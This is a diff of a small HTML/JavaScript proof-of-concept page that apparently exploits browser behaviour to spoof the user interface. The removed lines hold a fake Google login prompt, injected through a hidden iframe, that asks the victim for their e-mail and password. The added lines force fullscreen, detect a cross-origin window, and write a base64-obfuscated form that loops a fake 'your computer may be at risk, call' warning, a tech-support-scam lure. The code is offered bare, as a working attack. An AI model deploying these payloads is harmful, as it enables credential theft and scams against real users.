@@ -1,25 +1,26 @@
-<html>
-  <body>
 
-    <script>
+<body>
+<button onclick=foo()>go</button>
+</body>
 
-    function exploit() {
+<script>
 
-      window.open("https://www.google.com");
+var w;
+var t;
+function foo(){
+w = setTimeout('document.documentElement.webkitRequestFullscreen();',1201)
+t = setInterval('bar()',1);
+}
 
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-    
-    }
-    
-    </script>
+function bar(){
+try{
+w.location.href;
+}
+catch(e){
+clearInterval(t);
+setTimeout("document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));test()",1000);
+}
 
-    <br><br><br><br>
+}
 
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
-
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
-  </body>
-</html>
+</script>
